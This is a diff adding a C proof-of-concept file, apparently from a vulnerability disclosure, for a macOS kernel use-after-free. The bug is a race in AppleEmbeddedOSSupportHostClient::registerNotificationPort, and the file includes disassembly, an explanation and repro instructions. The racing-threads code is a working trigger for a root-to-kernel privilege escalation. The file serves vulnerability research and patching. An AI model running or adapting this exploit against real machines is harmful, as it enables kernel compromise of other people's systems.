@@ -1,0 +1,150 @@
+/*
+AppleEmbeddedOSSupportHost.kext is presumably involved in the communication with the OS running on the touch bar on new MBP models.
+
+Here's the userclient's registerNotificationPort method:
+
+__text:0000000000002DE4 ; AppleEmbeddedOSSupportHostClient::registerNotificationPort(ipc_port *, unsigned int, unsigned int)
+__text:0000000000002DE4                 push    rbp
+__text:0000000000002DE5                 mov     rbp, rsp
+__text:0000000000002DE8                 push    r14
+__text:0000000000002DEA                 push    rbx
+__text:0000000000002DEB                 mov     r14, rsi
+__text:0000000000002DEE                 mov     rbx, rdi
+__text:0000000000002DF1                 mov     rdi, [rbx+0E8h]
+__text:0000000000002DF8                 test    rdi, rdi
+__text:0000000000002DFB                 jz      short loc_2E0D
+__text:0000000000002DFD                 call    __ZN12IOUserClient23releaseNotificationPortEP8ipc_port ; IOUserClient::releaseNotificationPort(ipc_port *)
+__text:0000000000002E02                 mov     qword ptr [rbx+0E8h], 0
+__text:0000000000002E0D
+__text:0000000000002E0D loc_2E0D:                               ; CODE XREF: AppleEmbeddedOSSupportHostClient::registerNotificationPort(ipc_port *,uint,uint)+17j
+__text:0000000000002E0D                 mov     [rbx+0E8h], r14
+__text:0000000000002E14                 xor     eax, eax
+__text:0000000000002E16                 pop     rbx
+__text:0000000000002E17                 pop     r14
+__text:0000000000002E19                 pop     rbp
+__text:0000000000002E1A                 retn
+
+The IOUserClient superclass doesn't implement any locking for this method; it's up to the user client itself to correctly prevent
+dangerous concurrent accesses.
+
+By calling registerNotificationPort in two threads in parallel we can cause a AppleEmbeddedOSSupportHostClient to drop two references on a port when 
+it only holds one.
+
+Note that AppleEmbeddedOSSupportHostClient is only reachable by root so this is a root -> kernel priv esc.
+
+Repro like this: while true; do ./embedded_host; done
+
+Please test on a machine which has a touchbar!
+ > kextstat | grep AppleEmbeddedOSSupport
+should display something if it does.
+*/
+
+// ianbeer
+#if 0
+MacOS kernel uaf due to lack of locking in AppleEmbeddedOSSupportHostClient::registerNotificationPort
+
+AppleEmbeddedOSSupportHost.kext is presumably involved in the communication with the OS running on the touch bar on new MBP models.
+
+Here's the userclient's registerNotificationPort method:
+
+__text:0000000000002DE4 ; AppleEmbeddedOSSupportHostClient::registerNotificationPort(ipc_port *, unsigned int, unsigned int)
+__text:0000000000002DE4                 push    rbp
+__text:0000000000002DE5                 mov     rbp, rsp
+__text:0000000000002DE8                 push    r14
+__text:0000000000002DEA                 push    rbx
+__text:0000000000002DEB                 mov     r14, rsi
+__text:0000000000002DEE                 mov     rbx, rdi
+__text:0000000000002DF1                 mov     rdi, [rbx+0E8h]
+__text:0000000000002DF8                 test    rdi, rdi
+__text:0000000000002DFB                 jz      short loc_2E0D
+__text:0000000000002DFD                 call    __ZN12IOUserClient23releaseNotificationPortEP8ipc_port ; IOUserClient::releaseNotificationPort(ipc_port *)
+__text:0000000000002E02                 mov     qword ptr [rbx+0E8h], 0
+__text:0000000000002E0D
+__text:0000000000002E0D loc_2E0D:                               ; CODE XREF: AppleEmbeddedOSSupportHostClient::registerNotificationPort(ipc_port *,uint,uint)+17j
+__text:0000000000002E0D                 mov     [rbx+0E8h], r14
+__text:0000000000002E14                 xor     eax, eax
+__text:0000000000002E16                 pop     rbx
+__text:0000000000002E17                 pop     r14
+__text:0000000000002E19                 pop     rbp
+__text:0000000000002E1A                 retn
+
+The IOUserClient superclass doesn't implement any locking for this method; it's up to the user client itself to correctly prevent
+dangerous concurrent accesses.
+
+By calling registerNotificationPort in two threads in parallel we can cause a AppleEmbeddedOSSupportHostClient to drop two references on a port when 
+it only holds one.
+
+Note that AppleEmbeddedOSSupportHostClient is only reachable by root so this is a root -> kernel priv esc.
+
+Repro like this: while true; do ./embedded_host; done
+
+Please test on a machine which has a touchbar!
+ > kextstat | grep AppleEmbeddedOSSupport
+should display something if it does.
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+
+#include <mach/mach.h>
+#include <mach/host_priv.h>
+
+#include <IOKit/IOKitLib.h>
+
+mach_port_t q() {
+  mach_port_t p = MACH_PORT_NULL;
+  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+  mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+  return p;
+}
+
+volatile int start = 0;
+volatile mach_port_t conn;
+
+void* racer(void* arg) {
+  while(!start){;}
+	IOConnectSetNotificationPort(conn, 0, MACH_PORT_NULL, 0);
+  return NULL;
+}
+
+
+
+int main() {
+	kern_return_t err;
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleEmbeddedOSSupportHost"));
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+
+  conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+  if (err != KERN_SUCCESS){
+    printf("unable to get user client connection\n");
+    return 0;
+  }
+
+  mach_port_t p = q();
+
+	IOConnectSetNotificationPort(conn, 0, p, 0);
+
+  //mach_port_destroy(mach_task_self(), p);
+  // kernel holds the only ref
+
+
+  int n_threads = 2;
+  pthread_t threads[n_threads];
+  for(uint32_t i = 0; i < n_threads; i++) {
+    pthread_create(&threads[i], NULL, racer, NULL);
+  }
+
+  start = 1;
+
+  for(uint32_t i = 0; i < n_threads; i++) {
+    pthread_join(threads[i], NULL);
+	}
+
+  return 0;
+}
